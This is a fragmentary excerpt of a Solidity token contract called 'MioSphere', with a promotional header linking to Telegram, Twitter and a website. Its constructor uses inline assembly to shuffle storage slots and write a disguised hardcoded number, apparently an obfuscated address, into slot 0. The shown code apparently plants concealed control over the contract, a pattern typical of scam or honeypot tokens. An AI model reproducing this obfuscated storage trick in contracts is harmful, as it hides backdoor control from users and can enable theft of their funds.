...
/*
Welcome to MioSphere.

Telegram: https://t.me/MioSphere/
Twitter: https://twitter.com/MioSphere/
Website: https://MioSphere.io
...
contract MioSphere {
    string public constant name = "MioSphere";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(329466718397654992989785916255642621007155842185, 5))}
